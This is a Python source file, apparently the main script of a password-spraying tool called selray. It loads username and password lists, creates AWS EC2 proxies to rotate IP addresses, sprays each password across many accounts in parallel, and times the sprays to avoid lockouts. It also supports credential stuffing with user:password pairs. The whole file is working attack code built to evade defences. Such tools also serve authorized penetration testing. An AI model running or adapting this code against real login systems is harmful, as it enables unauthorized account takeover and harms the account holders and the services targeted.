from datetime import datetime, timedelta
from multiprocessing import Process, Queue
from selray.utils import SprayConfig, aws, utils, update
import pause

# --------------------------------- #
# GLOBAL VARIABLES                  #
# --------------------------------- #

__version__ = "0.6"


# --------------------------------- #
# FUNCTIONS                         #
# --------------------------------- #

def main():
    args = utils.parse_arguments()
    ec2 = aws.get_ec2_session(args.aws_region, args.aws_access_key, args.aws_secret_key, args.aws_session_token)
    if args.proxy_clean:
        utils.list_proxies(args, ec2)
        exit()
    elif args.proxy_list:
        utils.list_proxies(args, ec2)
        exit()
    elif args.update:
        update.self_update()

    # Prepare variables
    if args.mode:
        utils.load_mode_config(args)
    args.fail, args.success = utils.prepare_success_fail(fail=args.fail, success=args.success)
    args.usernames = utils.process_file(args.usernames)
    if args.passwords:
        args.passwords = utils.process_file(args.passwords)
    else:
        args.passwords = []
    args.usernames = utils.prepare_usernames(args.usernames, args.domain, args.domain_after)
    args.url = utils.prepare_url(args.url)
    args.invalid_username = utils.prepare_invalid_username(invalid_username=args.invalid_username)
    args.lockout = utils.prepare_lockout(lockout_messages=args.lockout)
    (username_field_key, username_field_value, password_field_key, password_field_value, checkbox_key,
     checkbox_value) = utils.prepare_fields(args.username_field, args.password_field, checkbox=args.checkbox)
    if not args.threads:  # TODO Move this somewhere cleaner. It isn't set by default, because it needs to be loaded from the modes file, if a mode is specified
        args.threads = 5
    utils.print_beginning(args, version=__version__)

    ec2 = aws.get_ec2_session(args.aws_region, args.aws_access_key, args.aws_secret_key, args.aws_session_token)
    proxies = utils.prepare_proxies(ec2, args)

    spray_config = SprayConfig.SprayConfig(
        url=args.url,
        username_field_key=username_field_key,
        username_field_value=username_field_value,
        password_field_key=password_field_key,
        password_field_value=password_field_value,
        checkbox_key=checkbox_key,
        checkbox_value=checkbox_value,
        fail=args.fail,
        success=args.success,
        invalid_username=args.invalid_username,
        num_sprays_per_ip=args.num_sprays_per_ip,
        aws_region=args.aws_region,
        aws_access_key=args.aws_access_key,
        aws_secret_key=args.aws_secret_key,
        aws_session_token=args.aws_session_token,
        lockout=args.lockout,
        threads=args.threads,
    )

    results = []

    # Perform credential stuffing, if that's what's in store:
    if not args.passwords and ":" in args.usernames[1]:
        utils.credential_stuffing(spray_config, args, proxies)
    else:

    # Loop through passwords
        password_id = 0
        while password_id < len(args.passwords):
            next_start_time = datetime.now() + timedelta(minutes=args.delay)  # Check when the next spray should run

            print(f"Beginning spray with password '{args.passwords[password_id]}'")

            # Split users among proxies
            chunk_size = (len(args.usernames) + len(proxies) - 1) // len(proxies)
            user_chunks = [args.usernames[i:i + chunk_size] for i in range(0, len(args.usernames), chunk_size)]

            processes = []
            queue = Queue()
            for proxy, user_chunk in zip(proxies, user_chunks):
                credentials = [{'USERNAME': username, 'PASSWORD': args.passwords[password_id]} for username in
                               user_chunk]
                p = Process(target=utils.perform_spray, args=(spray_config, credentials, proxy, queue))
                p.start()
                processes.append(p)

            for p in processes:
                p.join()

            # Gather all results
            while not queue.empty():
                results.extend(queue.get())

            # Check to see if the process is at the end. If not, wait the specified time.
            password_id += 1
            if password_id < len(args.passwords):
                print(f"Spray of password '{args.passwords[(password_id - 1)]}' complete. Waiting until "
                      f"{next_start_time.strftime('%H:%M')} to start next spray.")
                pause.until(next_start_time)
            else:
                print(f"Spray of password '{args.passwords[password_id - 1]}' complete. All passwords complete.")

    utils.destroy_proxies(args, ec2)
    utils.print_ending(results)


# --------------------------------- #
# MAIN                              #
# --------------------------------- #

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nCtrl+C Detected")
        utils.print_ending([{'USERNAME': '', 'PASSWORD': '', 'RESULT': 'CANCELLED'}])
        exit()
